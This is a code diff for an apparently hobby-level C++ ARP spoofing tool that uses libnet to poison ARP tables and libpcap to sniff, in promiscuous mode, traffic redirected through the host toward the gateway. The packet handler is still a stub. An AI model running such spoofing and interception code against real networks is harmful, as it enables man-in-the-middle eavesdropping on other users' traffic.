@@ -6,18 +6,27 @@
  *
  */
 
-#include <unistd.h>
 #include <libnet.h>
+
+#include <pcap.h>
+#include <signal.h>
+#include <stdlib.h>
+#include <string.h>
 #include <arpa/inet.h>
 #include <linux/if_arp.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
+#include <linux/ip.h>
 #include <sys/ioctl.h>
+#include <unistd.h>
+
+#include <thread>
+#include <chrono>
+#include <string>
+#include <iostream>
+#include <sstream>
 #include <csignal>
 
- #include <thread>
- #include <chrono>
-#include <iostream>
 
 
 // TODO
@@ -33,7 +42,10 @@
 libnet_t *ln;
 int sfd;
 
-void *spoof(const char *interface_name, char *address) {
+char* errbuf;
+pcap_t* handle;
+
+void spoof(const char *interface_name, char *address) {
     // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
     u_int32_t target_ip_addr, zero_ip_addr;
     u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
@@ -69,56 +81,49 @@ void *spoof(const char *interface_name, char *address) {
 
 }
 
-void *capture(char *interface_name) {
-    struct ifreq interface_struct;          // interface structure -> needed for interface identification
-    struct sockaddr_ll sall;                // address sockeet structure -> for binding
+std::string createFilter(std::string gatewayIp) {
+    // ether dst ADDRESS_MAC and dst host IP
+    std::stringstream str;
+    std::string thisHostMacAddress = "50:b7:c3:cd:17:2e";  // TODO hardcoded
+    str << "ether dst " << thisHostMacAddress << " and dst host " << gatewayIp;
+    return str.str();
+}
 
-    sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));        // get socket's descriptor no
-    strncpy(interface_struct.ifr_name, interface_name, IFNAMSIZ);   // read interface name and save it to interface_struct
-    ioctl(sfd, SIOCGIFINDEX, &interface_struct);                    // get interface index from query (based on interface_struct)
-    memset(&sall, 0, sizeof(struct sockaddr_ll));                   // fill sall structure with zeros
+void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
+    printf("[%dB of %dB]\n", h->caplen, h->len);
+    struct ethhdr* etherHeader = (struct ethhdr*) bytes;
 
-    // FILL sall structure with info:
-    sall.sll_family = AF_PACKET;                                    // always AF_PACKET
-    sall.sll_protocol = htons(ETH_P_ALL);                           // frames from everyone
-    sall.sll_ifindex = interface_struct.ifr_ifindex;                // interface index
-    sall.sll_hatype = ARPHRD_ETHER;
-    sall.sll_pkttype = PACKET_HOST;
-    sall.sll_halen = ETH_ALEN;                                      // MAC address size
+    // len - bytes count copied from frame
+    // caplen - bytes count saved in buffer
+}
 
-    // bind sfd descriptor with sall structure:
-    bind(sfd, (struct sockaddr *) &sall, sizeof(struct sockaddr_ll));
+void capture(char *interface_name, char *address) {
+    bpf_u_int32 netp, maskp;
+    struct bpf_program fp;
+    errbuf= static_cast<char *>(malloc(PCAP_ERRBUF_SIZE));          // alloc memory for error buffer
+    handle = pcap_create(interface_name, errbuf);                   // alloc for handler
+    pcap_set_promisc(handle, 1);
+    pcap_set_snaplen(handle, 65535);                                // frame length
+    pcap_activate(handle);
 
-    while (true) {
-        // ALLOCATE MEMORY FOR FRAME
-        char *frame = static_cast<char *>(malloc(ETH_FRAME_LEN));
-        memset(frame, 0, ETH_FRAME_LEN);
-        struct ethhdr *fhead = (struct ethhdr *) frame;
-
-        // RECEIVE frame
-        ssize_t len;
-        len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, nullptr, nullptr);
-
-        // TODO wziąć zapytania na bramę i wysłać je tam (zmienić adres MAC - wprowadzany z linii poleceń)
-        // DESTINATION IP           : DEFAULT GATEWAY
-        // DESTINATION MAC ADDRESS  : MY COMPUTER'S ID
-        if (fhead->h_source[5] != 78 && fhead->h_source[5] != 232 && fhead->h_source[5] != 232) {
-            printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int) len,
-                   fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
-                   fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
-            printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
-                   fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
-                   fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
-            printf("\n\n");
-        }
-        free(frame);
+    // FILTERING:
+    pcap_lookupnet(interface_name, &netp, &maskp, errbuf);   // get filter args
+    std::string filter= createFilter(address);
+    pcap_compile(handle, &fp, filter.c_str(), 0, netp);      // compile filter
+    if (pcap_setfilter(handle, &fp) < 0) {
+        pcap_perror(handle, "pcap_setfilter()");
+        exit(EXIT_FAILURE);
     }
+
+    pcap_loop(handle, -1, trap, NULL);        // run trap
 }
 
 void stop(int signal) {
     // TODO clean memory
     libnet_destroy(ln);
-    close(sfd);
+    pcap_close(handle);
+    free(errbuf);
+    // close(sfd);
     exit(EXIT_SUCCESS);
 }
 
@@ -131,7 +136,7 @@ int main(int argc, char **argv) {
     std::signal(SIGINT, stop);
 
     std::thread arp_spoofer(spoof, argv[1], argv[2]);
-    std::thread capturer(capture, argv[1]);
+    std::thread capturer(capture, argv[1], argv[2]);
 
     arp_spoofer.join();
     capturer.join();
